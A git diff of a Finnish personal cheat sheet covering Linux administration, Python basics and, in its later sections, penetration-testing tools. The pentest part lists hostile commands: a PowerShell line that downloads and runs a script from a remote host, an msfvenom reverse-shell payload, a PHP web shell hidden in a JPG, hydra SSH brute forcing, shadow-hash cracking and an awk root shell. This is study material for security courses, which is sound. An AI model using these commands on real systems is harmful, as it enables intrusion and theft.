@@ -25,47 +25,53 @@ systemctl --user start pulseaudio		<--->   Kali Linuxiin aanet
 
 ________________________________________________________________________________________________________________________________
 *** KANSIOT LINUXIIN ***
-ls			<--->	Listaa nykyisen hakemiston tiedostot
-ls -a			<--->	Listaa myos hidden folderit all toiminolla
-ls -l			<--->	Nayttaa tiedostojen oikeudet
-pwd			<--->	Listaa taman hetkisen hakemiston "print working directory"
-du -h foldename/	<--->	listaa paljon kansio vie tilaa
+ls						<--->	Listaa nykyisen hakemiston tiedostot
+ls -a						<--->	Listaa myos hidden folderit all toiminolla
+ls -l						<--->	Nayttaa tiedostojen oikeudet
+pwd						<--->	Listaa taman hetkisen hakemiston "print working directory"
+du -h foldename/				<--->	listaa paljon kansio vie tilaa
 
-mkdir kansionnimi	<--->	Luo kansion
-mkdir -p /kansio/kansio	<--->	Luo myos ali kansiot
+mkdir kansionnimi				<--->	Luo kansion
+mkdir -p /kansio/kansio				<--->	Luo myos ali kansiot
 
-cd /			<--->	Menee tiettyyn tiedostoon esim cd / menee / kansioon
-cd /var/log		<--->	Menee log kansioon
-cd			<--->	Pelkka cd menee takaisin käyttäjän omaan home kansioon
-cd ..			<--->	Menee takaisin pain hakemistossa
-TAB			<--->	TAB automaattisesti tayttaa kansioita valitaessa
+cd /						<--->	Menee tiettyyn tiedostoon esim cd / menee / kansioon
+cd /var/log					<--->	Menee log kansioon
+cd						<--->	Pelkka cd menee takaisin kayttajan omaan home kansioon
+cd ..						<--->	Menee takaisin pain hakemistossa
+cd -						<--->	Menee vimeksi aukioleeseen kansioon
+TAB						<--->	TAB automaattisesti tayttaa kansioita valitaessa
 
-chmod ugo+rwx		<--->	Read write ja execute oikeus. user group ja other kayttajille
-mv oldname newname	<--->	Vaihtaa tiedoston nimen
-rm tiedosto		<--->	Poistaa tiedoston
-rm -r kansio		<--->	Poistaa kansion rekursiivisesti
-mv tiedostonnimi kansio/<--->	Vie tiedoston toiseen kansioon
-cp tiedostonnimi kansio/<--->	Kopioi tiedoston toiseen kansioon
-cp -rp			<--->	RP lipuilla kopioidaan myos tiedoston oikeudet recursiivisesti
+echo hello > testi.txt				<--->	Korvaa tiedoston testi.txt hello sanalla
+echo hello >> testi.txt				<--->	Vie hello sanan testi.txt tiedoston loppuun omalle riville
+cat testi1.txt test2.txt >> testi3.txt		<--->	Yhditää 2 tiedostoa testi3.txt tiedostoon.
+cat testi* >> testi4.txt			<--->	Valitsee kaikki testi alkuiset tiedostot ja vie testi4.txt tiedostoon
 
-/etc			<--->	kaikkien ohjelmien asetuksien kansio
-/var/log/auth.log	<--->	Kirjautumis loki tiedosto
+chmod ugo+rwx					<--->	Read write ja execute oikeus. user group ja other kayttajille
+mv oldname newname				<--->	Vaihtaa tiedoston nimen
+rm tiedosto					<--->	Poistaa tiedoston
+rm -r kansio					<--->	Poistaa kansion rekursiivisesti
+mv tiedostonnimi kansio/			<--->	Vie tiedoston toiseen kansioon
+cp tiedostonnimi kansio/			<--->	Kopioi tiedoston toiseen kansioon
+cp -rp						<--->	RP lipuilla kopioidaan myos tiedoston oikeudet recursiivisesti
 
-/etc/systemd/system	<--->	Uudelleen käynnistyksessä päälle tulevat ohjelmistot
+/etc						<--->	kaikkien ohjelmien asetuksien kansio
+/var/log/auth.log				<--->	Kirjautumis loki tiedosto
+
+/etc/systemd/system				<--->	Uudelleen kaynnistyksessa paalle tulevat ohjelmistot
 
 ________________________________________________________________________________________________________________________________
 *** HAKUTOIMINTO *** 
-alt+.			<--->   viimeisen komennon viimeinen sana
-less teksti.txt		<--->	Haku komento, joka tuo yhdensivun kerralla
-tail teksti.txt -F	<--->	Avaa tiedoston 10viimeista rivia ja -F paivittaa tietoja
-cat teksti.txt		<--->	Avaa tiedoton sisällön
-history			<--->	Nayttaa vanhat kommennot
-which bash		<--->	Mistä bash ajetaan
-env			<--->	bash scriptiin tietoja koneesta
+alt+.							<--->   viimeisen komennon viimeinen sana
+less teksti.txt						<--->	Haku komento, joka tuo yhdensivun kerralla
+tail teksti.txt -F					<--->	Avaa tiedoston 10viimeista rivia ja -F paivittaa tietoja
+cat teksti.txt						<--->	Avaa tiedoton sisallon
+history							<--->	Nayttaa vanhat kommennot
+which bash						<--->	Mista bash ajetaan
+env							<--->	bash scriptiin tietoja koneesta
 
-"|" putki merkki	<--->	Liimataan komentoja 
-| grep haku		<--->	Hakee tietueesta hakusanalla
-| grep -ir haku		<--->	Haku paremmalla rivityksellä
+"|" putki merkki					<--->	Liimataan komentoja 
+| grep haku						<--->	Hakee tietueesta hakusanalla
+| grep -ir haku						<--->	Haku paremmalla rivityksella
 
 find -printf "%T+ %p\n"|sort				<--->   Kertoo asennetujne ohjelmien ajan jarjesteksyssa
 find -printf '%T+ M %p\n%A+ A %p\n%C+ C %p\n'|sort	<--->	Kertoo asennettujen ohjelmien ajan jarjestyksessa
@@ -76,7 +82,7 @@ find ./ | grep '.exe'					<--->	Etsii kansiotai eteenpain exe tiedostoja
 
 ________________________________________________________________________________________________________________________________
 *** Metadata ***
-exiftool                <--->   libimage-exiftool-perl kertoo tiedoton luonti ajan ja muita tietoja
+exiftool	<--->	libimage-exiftool-perl kertoo tiedoton luonti ajan ja muita tietoja
 
 patterns.dunttus.com kuvien metadata bashilla:
 exiftool -by-line="[Joni Hakala]" -CopyrightNotice="© [Joni Hakala] ; \
@@ -105,7 +111,7 @@ sudo do-release-upgrade -d		<--->	Asentaa uusimman version Linuxista muista otta
 
 sudo ubuntu-drivers autoinstall		<--->	Asentaa esim Nvidia ajurit
 DEBIAN 9->10
-apt-get dist-upgrade			<--->	Kernel päivitykset
+apt-get dist-upgrade			<--->	Kernel paivitykset
 lsb_release -a				<--->	Linux version tarkastus
 uname -mrs				<--->	Kernel versio tarkastus
 nano /etc/apt/sources.list		<--->	Vaihda stretch -> buster
@@ -153,12 +159,12 @@ ss -lntpt					<--->	Avoimet portit
 ssh user@domain.com				<--->	SSH yhteys default 22 portiin
 
 echo hei | sudo tee /var/www/html/index.html	<--->	Korvaa apache testisivun sanalla hei
-sudo a2enmod userdir				<--->	Käyttäjien oma public_html kansio käyttöön
+sudo a2enmod userdir				<--->	Kayttajien oma public_html kansio kayttoon
 /home/user/public_html/index.htlm		<--->	Html sivun koti hakemisto, a2enmod userdir
 http://localhost/~user/				<--->	Selaimella kayttajan kansion sivuun
-systemctl restart apache2			<--->	Uudelleenkäynnistää apachen2
+systemctl restart apache2			<--->	Uudelleenkaynnistaa apachen2
 
-index.php					<--->	Jotta saadaan php kayttoon vaihdataan pääte .php
+index.php					<--->	Jotta saadaan php kayttoon vaihdataan paate .php
 libapache2-mod-php				<--->	Php lisaosa apacheen
 cd/etc/apache2/					<--->	Asetukset apacheen
 <?php print(1+1)?>				<--->	Esimerkki php koodista jos HTML sivule tulee 2 php on paalle
@@ -179,7 +185,7 @@ sudo userdel joni				<--->	Poistaa kayttajan joni
 sudo usermod --lock root			<--->	Lukitsee root salasanan
 etc/ssh/sshd_config				<--->	SSH asetuksin kansio
 sudoedit sshd_config				<--->	PermitRootLogin vaihdetaan taalta "no"
-sudo service ssh restart			<--->	SSH uudelleen käynnistys = asetukset tulee voimaan
+sudo service ssh restart			<--->	SSH uudelleen kaynnistys = asetukset tulee voimaan
 host dunttus.com dnsl.registrar-server.com	<--->	Talla voidaan katsoa hostin tietoja
 sudo a2ensite dunttus-com.conf			<--->	Lisaa tiedoston conf tiedostoon
 
@@ -232,8 +238,8 @@ dstat				<--->	Verkkoliikenteen seuranta ohjelma
 
 free -h				<--->	RAM muisti
 sudo iotop -oa			<--->	Levytilan kulutus
-sysstat	| grep			<--->	Kerää lokitietoja
-etc/default/sysstat		<--->	ENABLED="true" asetuksista päälle
+sysstat	| grep			<--->	Keraa lokitietoja
+etc/default/sysstat		<--->	ENABLED="true" asetuksista paalle
 sar				<--->	Tietoa prosessorin kaytosta
 systemctl restart		<--->	Jos ei toimi palvelun uudelleen kaynnistys
 systemctl status		<--->	Ohjelman status
@@ -245,7 +251,7 @@ pstree -Up | less		<--->	prosessi puu
 
 hostname -I			<--->	Oma ip osoite
 
-df -ah				<--->	Paljon disk tilaa jäljellä
+df -ah				<--->	Paljon disk tilaa jaljella
 
 ________________________________________________________________________________________________________________________________
 *** SCRIPTIT ***
@@ -258,7 +264,7 @@ ls -l hei.sh			<--->	Nayttaa oikeudet tiedostosta hei.sh
 chmod u+rw hei.sh		<--->	User read ja write oikeudet tiedostolle hei.sh
 chmod ugo+x hei.sh		<--->	Kaikkille oikeudet execute
 ls /usr/local/bin/		<--->	Kansio kaikkille kayttajille
-which bash			<--->	Kertoo mistä bash ajetaan
+which bash			<--->	Kertoo mista bash ajetaan
 
 nano hei.py			<--->	Luo teksti tiedoston johon voidaan kirjoittaa pyhthonia
 phython3 hei.py			<--->	Avaa phythonin tulkin
@@ -283,11 +289,11 @@ Prefix+d			<--->	Deletoi ikkunan
 
 ________________________________________________________________________________________________________________________________
 *** USERS PASSWORDS *** 
-jhakala tai joni		<--->	Esimerkki käytäjä, max 8merk, a-z, alkaa kirjaimella.
-pavahx6Ousoh			<--->	Hyvä alkusalasan on satunainen ja kirjoitetaan muistiin. 
+jhakala tai joni		<--->	Esimerkki kaytaja, max 8merk, a-z, alkaa kirjaimella.
+pavahx6Ousoh			<--->	Hyva alkusalasan on satunainen ja kirjoitetaan muistiin. 
 ls -ld salasanat.txt		<--->	Oikeudet salasana teksti tiedostolle
 chmod og-rwx salasanat.txt	<--->	Poistaa oikeudet read write execute
-sudo adduser joni		<--->	Luo käyttäjän joni
+sudo adduser joni		<--->	Luo kayttajan joni
 pwgen 12 2			<--->	Generoi 12-merkkin salasanan 2 kertaa
 
 ________________________________________________________________________________________________________________________________
@@ -296,10 +302,10 @@ Asennus:
 sudo apt-get install mariadb-client mariadb-server
 
 Kayttajan luonti:
-GRANT ALL ON databasenimi.* TO käyttäjännimi@localhost IDENTIFIED BY 'salasana';
+GRANT ALL ON databasenimi.* TO kayttajannimi@localhost IDENTIFIED BY 'salasana';
 
 Kirjautuminen:
-mariadb --user=käyttäjännimi --password
+mariadb --user=kayttajannimi --password
 
 SOURCES:
 Pohjana Tero Karvinen 2012: Linux kurssi, http://terokarvinen.com
@@ -317,19 +323,19 @@ ________________________________________________________________________________
 ** Cisco Kytkimien configurointi **
 enable                                  <--->   Avaa reititimeen admin asetuksia
 set                                     <--->   Automatisoitu configurointi
-show running-config                     <--->   Näyttää asetuksia
-show ip route                           <--->   Tietoja reitityksistä
+show running-config                     <--->   Nayttaa asetuksia
+show ip route                           <--->   Tietoja reitityksista
 show ip interfaces brief                <--->   Tietoa ip intefaceista
 show interfaces                         <--->   Tietoa intefaceista
 show ipv6 interface                     <--->   ipv6 samat komennot
 hostname nimi                           <--->   Vaihtaa kytkimine nimen
 enable secret class                     <--->   Encryptaa salasanan
 line console 1                          <--->   Siirtyy consoleen
-password salasana                       <--->   Määrittää consoleen salasanan
+password salasana                       <--->   Maarittaa consoleen salasanan
 login                                   <--->   Kirjautuminen
 exit                                    <--->   Console yhteyden sulkeminen
 service password-encryption             <--->   Encryptaa salasanan
-copy running-config startup-config      <--->   Kopioi tämän hetkiset asetukset
+copy running-config startup-config      <--->   Kopioi taman hetkiset asetukset
 
 configure terminal                      <--->   Konfigurointi mode
 interface gigabitethernet 0/0           <--->   Tietyn kytkin portin configurointi
@@ -337,7 +343,7 @@ interface serial 0/0/0                  <--->   Serial kytkimen configurointi
 interface loopback 0                    <--->   Loopback osoiteen configurointi
 ip address 10.10.10.1 255.255.255.0     <--->   Ip osoite ja maski
 ipv6 address 2001::1/64                 <--->   Ipv 6 osoite ja maski
-no shutdown                             <--->   Vaihdettu ip saadaan käyttöön
+no shutdown                             <--->   Vaihdettu ip saadaan kayttoon
 exit
 
 ********************************************************************************************************************************
@@ -356,9 +362,9 @@ master: 10.0.0.0                        <--->   Salt master rivi tiedostossa min
 id: orjaid				<--->	Orjalle id minion tiedostoon mastrin alle 
 systectl restart salt-minion            <--->   Uudelleen kaynnistaa salt minionin
 
-sudo salt-key                           <--->   Näyttää masterille lisätyt kayttajat
-sudo salt-key -A                        <--->   Ottaa vastaan kaikki käyttäjät
-sudo salt-key -d user			<--->	Poistaa tietyn käyttäjän
+sudo salt-key                           <--->   Nayttaa masterille lisatyt kayttajat
+sudo salt-key -A                        <--->   Ottaa vastaan kaikki kayttajat
+sudo salt-key -d user			<--->	Poistaa tietyn kayttajan
 
 sudo salt '*' cmd.run 'whoami'          <--->   Lahettaa minionille terminaali komennon whoami
 sudo salt '*' grains.items              <--->   Kysyy orjilta tietoja
@@ -367,9 +373,9 @@ sudo salt '*' sys.doc|less              <--->   Generoi saltista dokumentin
 
 /srv/salt/				<--->	Salt tilojen default kansio masterilla
 top.sls					<--->	Avaa kansionimen perusteella init.sls tiedoston
-init.sls				<--->	Init.sls tiedosto sisältää ohjeet minion koneille esim. Asennus paketit
+init.sls				<--->	Init.sls tiedosto sisaltaa ohjeet minion koneille esim. Asennus paketit
  _______________________
-|srv/salt/top.sls       |               <--->   Perus top.sls tiedoston sisältö
+|srv/salt/top.sls       |               <--->   Perus top.sls tiedoston sisalto
 |base:                  |
 |  '*':                 |
 |    - hello            |
@@ -377,7 +383,7 @@ init.sls				<--->	Init.sls tiedosto sisältää ohjeet minion koneille esim. Ase
 |    - webdev           |
 |_______________________|
  _______________________
-|/tmp/webdev.txt:       |		<--->   Perus init.sls tiedoston sisältö
+|/tmp/webdev.txt:       |		<--->   Perus init.sls tiedoston sisalto
 |  curl:                |
 |    pkg.installed      |
 |  apache2              |
@@ -400,7 +406,7 @@ git config --global user.name "Nimi"    <--->   Lisaa kayttajalle nimen committi
 
 git diff				<--->   Naytaa miten tiedostoa vaihdettu
 git diff --cached			<--->   Valimuistin tiedoston vaihdot
-git reset --hard			<--->   Menee takaisinpäin versioissa merkilla # voi kommentoida
+git reset --hard			<--->   Menee takaisinpain versioissa merkilla # voi kommentoida
 
 git clone URL				<--->   Kopioi repositoryn omalle koneelle
 pull push				<--->   Ensin pull sitten push
@@ -433,7 +439,7 @@ docker system prune			<--->	Tuhoaa kaikki kontit, jotka on kiinni
 docker container ls -a			<--->	Listaa kontit
 docker ps -a				<--->	Listaa kontit
 docker -d -t				<--->	Ajaa kontin taustalle
-docker exec -it name			<--->	Avaa kontin nimellä bashilla
+docker exec -it name			<--->	Avaa kontin nimella bashilla
 docker images -a			<--->	Listaa kaikki docker imaget
 docker image rm 9bf9865			<--->	Poista idlla
 
@@ -446,9 +452,9 @@ ________________________________________________________________________________
 ** CONDA **
 conda install jupyter					<--->	Windows CMD conda asentaa jupyter notebookin
 conda install tensorflow				<--->	Windows CMD conda asentaa tensorflown
-conda create -n tensorflow_gpuenv tensorflow-gpu	<--->	Windows CMD Tekee uuden conda paketin nimellä
-conda activate tensorflow_gpuenv			<--->	WINDOWS CMD Activoi tehdyn paketin
-jupyter notebook					<--->	WINDOWS CMD avaa uuden jupyter notebook instansen
+conda create -n tensorflow_gpuenv tensorflow-gpu	<--->	Windows CMD Tekee uuden conda paketin nimella
+conda activate tensorflow_gpuenv			<--->	Windows CMD Activoi tehdyn paketin
+jupyter notebook					<--->	Windows CMD avaa uuden jupyter notebook instansen
 
 ________________________________________________________________________________________________________________________________
 ** SALT WINDOWS **
@@ -487,31 +493,31 @@ ________________________________________________________________________________
 ** Python 3 IDLE **
 CTRL+N                                                  <--->   Avaa uuden ikkunan IDLE:ssa
 CTRL+K                                                  <--->   Poistaa rivin
-CTRL+F6                                                 <--->   Idlen uudelleenkäynnistys
+CTRL+F6                                                 <--->   Idlen uudelleenkaynnistys
 F5                                                      <--->   Ajaa koodin
 
 ________________________________________________________________________________________________________________________________
 ** Python alkeet **
-\                                                       <--->   \ enter jatkaa kommenttia toiselle riville jos  se on liian pitkä
-(""" -komentti """)                                     <--->   Voidaan myös jatkaa toiselle riville
+\                                                       <--->   \ enter jatkaa kommenttia toiselle riville jos  se on liian pitka
+(""" -komentti """)                                     <--->   Voidaan myos jatkaa toiselle riville
 #                                                       <--->   Python kommentti
-# -*- coding: cp1252 -*-                                <--->   Tulkille kerrotaan että koodissa skandinaavisia kirjaimia
+# -*- coding: cp1252 -*-                                <--->   Tulkille kerrotaan etta koodissa skandinaavisia kirjaimia
 
 ** Print **
 print("asd") #kommentti                                 <--->   Kommentti voidaa laittaa samalle riville
 print("HelloWorld")                                     <--->   Printtaus pythonilla
-print("rivin vahto. \n")                                <--->   Tulostus ja tyhjä rivi
+print("rivin vahto. \n")                                <--->   Tulostus ja tyhja rivi
 print("muuttuja")                                       <--->   Muuttujan printtaus
-print("Torstaisin ruokana on pannukakkua ja",muuttuja)  <--->   Muuttujan ydistäminen
-print("Seinällä on",muuttuja,"muuttuja."                <--->   2 Muuttujaa
+print("Torstaisin ruokana on pannukakkua ja",muuttuja)  <--->   Muuttujan ydistaminen
+print("Seinalla on",muuttuja,"muuttuja."                <--->   2 Muuttujaa
 print(muuttuja+"!")                                     <--->   Muuttujaan liimaus
 print("Ei tule rivinvaihtoa. ",end="")                  <--->   Seuraavalle printille ei rivin vaihtoa
-print("Minulla on",muuttuja,"kappaletta.", sep="")      <--->   sep ottaa välit muuttujan ympäriltä pois
-print("Nimi:\tHakala Joni")                             <--->   \t tekee tab välin tulostuksessa
+print("Minulla on",muuttuja,"kappaletta.", sep="")      <--->   sep ottaa valit muuttujan ymparilta pois
+print("Nimi:\tHakala Joni")                             <--->   \t tekee tab valin tulostuksessa
 
 ________________________________________________________________________________________________________________________________
 ** muuttujat **
-muuttuja = "pizza"	                                <--->   Pythyon muuttujan, ei skandeja, erikois merkkejä, varattuja
+muuttuja = "pizza"	                                <--->   Pythyon muuttujan, ei skandeja, erikois merkkeja, varattuja
 muuttuja = "rivin vahto. \n"                            <--->   \n tekee muuttujan peraan tyhjan rivin
 numero = 100                                            <--->   Numero muuttuja ilman ""
 numero = "100"                                          <--->   Numero Stringina
@@ -525,24 +531,24 @@ numero + 150                                            <--->   Numero muuttujaa
 
 ________________________________________________________________________________________________________________________________
 ** Input **
-lukuarvo = input("Kuinka vanha olet:")                  <--->   Kysyy käyttäjältä muuttuja arvon
+lukuarvo = input("Kuinka vanha olet:")                  <--->   Kysyy kayttajalta muuttuja arvon
 kierroksia = int(input("Kuinka monta kierrosta: "))     <--->   Int input arvo
 
 ________________________________________________________________________________________________________________________________
 ** Imports **
 import random                                           <--->   Tuo kirjaston random
 luku = random.randint(0,100)                            <--->   Print("luku") kayttaa random kirjastoa ja arpoo luvun
-dir(random)                                             <--->   Näyttaa eri funkioita random importissa
+dir(random)                                             <--->   Nayttaa eri funkioita random importissa
 help(random.randint)                                    <--->   Apua import toimintoon
 from random import randint                              <--->   Yhden funktion import
-import omatiedosto                                      <--->   omatiedosto.py import samalta kiintolevyltä
+import omatiedosto                                      <--->   omatiedosto.py import samalta kiintolevylta
 print(omatiedosto.funktio)                              <--->   omatiedosto.py importista funktio haku
 
 ________________________________________________________________________________________________________________________________
 ** errors **
-except Exception:                                       <--->   Virhetilanteiden jokeri luokka printaa oma syote printillä alle
-try:                                                    <--->   Ajaa koodin ja katsoo tuleeko virheitä oma syote printillä alle
-finally:                                                <--->   Lopetetaan ohkjelma jos tapahtuu virhe oma syote printillä alle
+except Exception:                                       <--->   Virhetilanteiden jokeri luokka printaa oma syote printilla alle
+try:                                                    <--->   Ajaa koodin ja katsoo tuleeko virheita oma syote printilla alle
+finally:                                                <--->   Lopetetaan ohkjelma jos tapahtuu virhe oma syote printilla alle
 class OmaVirhe(Exception):                              <--->   Virhe luokassa
 
 ________________________________________________________________________________________________________________________________
@@ -554,7 +560,7 @@ tiedosto = open("testi.txt", "rb")                      <--->   Avaa tiedoston l
 tiedosto.close()                                        <--->   Sulkee tiedoston
 tallennusmuuttuja = tiedostokahva.lukufunktio()         <--->   Muuttuja funktiolla
 
-def myfunktio():                                        <--->   Funktio määritellään sanalla def
+def myfunktio():                                        <--->   Funktio maaritellaan sanalla def
 
 
 ********************************************************************************************************************************
@@ -578,7 +584,7 @@ Hack the box eu
 metasploit3
 mitmproxy
 foxyproxy
-yleisimmät salasanat itse tehty sanalista
+yleisimmat salasanat itse tehty sanalista
 geoipblocking
 jsnice
 ghidra
@@ -596,15 +602,15 @@ LinEnum			<--->	Githubissa ohjelma, joka etsii upgrade haavoituvuuksia
 PayloadsAllTheThings	<--->	Githubissa payloadeja eri kielille
 ________________________________________________________________________________________________________________________________
 ** Pentest alkeet **
-rmmod pcspkr                                    <--->   Piip ääni pois kalista
-/dev/shm/.virus.sh				<--->	Hyvä ram kansio viiruksille
+rmmod pcspkr                                    <--->   Piip aani pois kalista
+/dev/shm/.virus.sh				<--->	Hyva ram kansio viiruksille
 apt-cache search pentest                        <--->   Xubunulla haku
 
-virtualenv python3-pip                          <--->   Asennus Xubuntulle
-mkdir mitm
-virtualenv env -p python3
-source env/bin/activate
-pip install mitmproxy                           <--->   Asennus Xubuntulle
+virtualenv python3-pip                          <--->   Asennus Xubuntulle ensin ladataan python ohjelma virtualenv
+mkdir mitm					<--->	Luodaan kansio mitm
+virtualenv env -p python3			<--->	Luodaan kansiosta virtual enviroment
+source env/bin/activate				<--->	Activoidaan enviroment
+pip install mitmproxy                           <--->   Asennetaan mitmproxy virtual kansioon
 
 
 nc -vz localhost 80                             <--->   Portti scannaus 1portti Verbose Zero
@@ -629,10 +635,10 @@ e                                               <--->   Valikko
 tab                                             <--->   Tallentaa muutokset
 r                                               <--->   Reload page
 Shift+F                                         <--->   Seuraa uusia tiloja
-m                                               <--->   Voi vaihtaa kieltä sivulla esim css tai javascript
+m                                               <--->   Voi vaihtaa kielta sivulla esim css tai javascript
 f                                               <--->   Filter expressions mitmproxy
-i                                               <--->   Intersept=nimi näppäin "a" eteen päin 1askel
-shift+a                                         <--->   Intercept tilassa päästä kaikki loput läpi
+i                                               <--->   Intersept=nimi nappain "a" eteen pain 1askel
+shift+a                                         <--->   Intercept tilassa paasta kaikki loput lapi
 
 ________________________________________________________________________________________________________________________________
 ** Gobuster **
@@ -648,11 +654,11 @@ ________________________________________________________________________________
 ** SEARCHSPLOIT **
 searchsploit "app name"				<--->	Hakee tunnetuja haavoituvuuksia
 searchsploit -w "app name"			<--->	Tuo hakuun web sivun
-searchsploit -x id123.txt			<--->	Hakee lisätietoja IDn mukaan
+searchsploit -x id123.txt			<--->	Hakee lisatietoja IDn mukaan
 
 ________________________________________________________________________________________________________________________________
 ** WebGoat **
-POST ../../../../../WEB-INF/spring-security.xml <--->   Tehtävä bypass a path based access firefox inspector
+POST ../../../../../WEB-INF/spring-security.xml <--->   Tehtava bypass a path based access firefox inspector
 POST action DeleteProfile                       <--->
 SelectProfile --> DeleteProfile                 <--->
 User id 105 --> 104                             <--->
@@ -711,34 +717,34 @@ use linkki              <--->   Kaytetaan avaamaan exploit
 msfpc|less --raw
 -R                      <--->   Vaarallinen flagi RHOST asettaa kaikki tiedoston koneet maaliksi
 set                     <--->   Listaa RHOST maalit
-set RHOSTS 10.0.0.0     <--->   Yli ajaa RHOST tiedoston yhdellä maalilla
+set RHOSTS 10.0.0.0     <--->   Yli ajaa RHOST tiedoston yhdella maalilla
 
 ________________________________________________________________________________________________________________________________
 ** Meterpreter **
-install metaspoit-framework                     <--->   Päivittää explotit metasploitiin
+install metaspoit-framework                     <--->   Paivittaa explotit metasploitiin
 vagrant rapid7                                  <--->   vagrant tiedoston nimi
 nano vagrantfile copy paste kurssi sivulta      <--->
 vagrant up                                      <--->   Avaa vagrantfilen kautta koneen
-ip route                                        <--->   Näyttää ip aluetta
+ip route                                        <--->   Nayttaa ip aluetta
 ipcalc                                          <--->   Laskee IP alueen
 -sn ip -n -sV                                   <--->   nmap lippuja
 set RHOSTS ip                                   <--->   Maalitaulu koneen IP
 
 search vsftp                                    <--->   Etsii haavoituvuuksia
-use /kansio/kansio/                             <--->   Käyttää haavoituvuutta nimenmukaan
+use /kansio/kansio/                             <--->   Kayttaa haavoituvuutta nimenmukaan
 back ja options                                 <--->   valintoja use:ssa
-show payloads                                   <--->   näyttää payloadit
+show payloads                                   <--->   nayttaa payloadit
 set payload cmd/unix/                           <--->   explotin valinta
-exploit                                         <--->   Lähettää exploit paketin
+exploit                                         <--->   Lahettaa exploit paketin
 
 help                                            <--->   Antaa eri toimintoja
 background                                      <--->   Vie session taustalle
 sessions numero                                 <--->   Avaa session taustalta
 set SESSION 1                                   <--->   Targettaa session numeron mukaan
 search upgrade                                  <--->   Etsii ylennys toimintoa
-use /kansio                                     <--->   Käyttää ylennys toimintia set sessioon
+use /kansio                                     <--->   Kayttaa ylennys toimintia set sessioon
 meterpreter                                     <--->   Hyva terminaali ohjelmisto
-exloit                                          <--->   Lähetää ylennys pyynnon Sessioon
+exloit                                          <--->   Lahetaa ylennys pyynnon Sessioon
 
 MeterPreter: download /file/path		<--->	Lataa tiedostoja target koneesta
 MeterPreter: upload /file/path			<--->	Lataa tiedostoja target koneelle
@@ -757,26 +763,26 @@ grep user /etc/shadow                                                           
 $6$                                                                             <--->   Kertoo salauksen
 hashcat -m 1800 -a 0 '$6$'ifuhwapuifh sanalista                                 <--->   hc esim sha512
 man crypt                                                                       <--->   $6$ merkki salauksen tarkoitus
-s                                                                               <--->   Näkee eteenpäin scannauksen aikana
+s                                                                               <--->   Nakee eteenpain scannauksen aikana
 
 ________________________________________________________________________________________________________________________________
 ** THCHydra **
 cewl -w savefile.txt -d 3 -m 5 http://10.10.10.10/people/	<--->	Sanalistan luonti min 5 kirjain ja 3sivua alueesta
 
-hydra -l user -P sanalista 10.10.10.10 -t 4 ssh -V              <--->   SSH:n kautta yrittää aravata tietyn käyytäjän salasanaa
-hydra -L loginuserfile                                          <--->   Kokeilee kaikilla käyttäjillä jotka sanalistassa
+hydra -l user -P sanalista 10.10.10.10 -t 4 ssh -V              <--->   SSH:n kautta yrittaa aravata tietyn kayytajan salasanaa
+hydra -L loginuserfile                                          <--->   Kokeilee kaikilla kayttajilla jotka sanalistassa
 systemctl restart ssh                                           <--->   Jos ei toimi restart
-hydra http form                                                 <--->   Googlesta löytää web formeihin esimerkkejä
+hydra http form                                                 <--->   Googlesta loytaa web formeihin esimerkkeja
 
 ________________________________________________________________________________________________________________________________
 ** EyeWitness **
 eyewitness -f /root/ey/hosts            <--->   EyeWitness toiminto hosts tiedostoon tarvitaan domain tai ip
---web --prepend-https                   <--->   Liput jotka hakee webbisivusta myös https
+--web --prepend-https                   <--->   Liput jotka hakee webbisivusta myos https
 hosts                                   <--->   Listataan kansioon hostnimi tai ip
 
 ________________________________________________________________________________________________________________________________
 ** msfvenom **
-msfvenom --list payloads | grep -i linux        <--->   Hakee hyötykuormia
+msfvenom --list payloads | grep -i linux        <--->   Hakee hyotykuormia
 msfvenom --list formats
 msfvenom --payload linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f elf -o troijan
 
@@ -812,7 +818,7 @@ nc -vlp 5553 > testfile.txt                                                     
 nc 10.10.10.10 5333 < downloadfile.txt                                          <--->   Tiedoston vienti toiselle koneelle nclla
 
 exiftool -Comment='<?php echo "<pre>"; system($_GET['fun']); ?>' silver.jpg	<--->	JPG kuva php funktiolla
-mv silver.php.jpg								<--->	Nimen vaihto .php.jpg tiedostoksi
+mv silver.jpg silver.php.jpg							<--->	Nimen vaihto .php.jpg tiedostoksi
 
 ________________________________________________________________________________________________________________________________
 ** PrivEsc **
@@ -841,7 +847,7 @@ sudo -u user bash						<--->	Sudo toisella kayttajalla
 sudo su								<--->	Super User kirjautuminen
 sudo awk 'BEGIN {system("/bin/sh")}'				<--->	Root user awklla
 find / -perm -4000 2>/dev/null					<--->	Etsii tiedostoja 4000 oikeudella
-openssl passwd -h						<--->	Salasanan luonti passwd tiedostoon helpistä salasana parametrit
+openssl passwd -h						<--->	Salasanan luonti passwd tiedostoon -h salasana parametrit
 
 ________________________________________________________________________________________________________________________________
 ** VirtualhostScan **
@@ -851,7 +857,7 @@ wpscan --url http://localhost --enumerate u,ap,tt,t | tee teksti.txt	<--->	Scann
 ________________________________________________________________________________________________________________________________
 ** burpesuite **
 Port:8080			<--->	Proxyyn portti
-CTRL+r				<--->	Intersept lähetetään Repeaterille
+CTRL+r				<--->	Intersept lahetetaan Repeaterille
 CTRL+u				<--->	URL encoding jos omat komennot ei toimi
 CTRL+SHIFT+u			<--->	URL decode jotta saadaan luettavaan muotoon takaisin
 sudo tcpdump -i tun0 icmp	<--->	Takaisin pain pingaukseen
@@ -869,13 +875,13 @@ export TERM=screen		<--->	Jos nuolilla ei voi liikkua vimissa
 
 ________________________________________________________________________________________________________________________________
 ** ElasticSearch **
-curl localhost:9200/_cat/indices?v					<--->	Hakee elasticsearchiin tallenetut indexit
+curl localhost:9200/_cat/indices?v					<--->	Hakee elasticsearchiin tallennetut indexit
 curl -s localhost:9200/filebeat/_search?size=10000			<--->	Hakee indexin mukaan tiedot max size 10k
 cat filebeat.json | jq							<--->	Json data luettavaan muotoon
 cat filebeat.txt | python -mjson.tool | tee filebeat.txt		<--->	Muuntaa koko teksti tiedoston json muotoon
 grep 'apache' filename.txt > file.json					<--->	Grep filter apache sanalla
 
-Elasticsearchdump							<--->	Githubissa othelma, joka hakee tietoja
+Elasticsearchdump							<--->	Githubissa ohjelma, joka hakee tietoja
 
 ________________________________________________________________________________________________________________________________
 ** WINDOWS **
@@ -885,7 +891,7 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:PORTTI/Sherlock
 
 Get-ComputerInfo | select WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer		<--->	Versio tiedot
 
-systeminfo					<--->	Powershell komento joka antaa tietoja jarjestelmasta
+systeminfo					<--->	Powershell komento, joka antaa tietoja jarjestelmasta
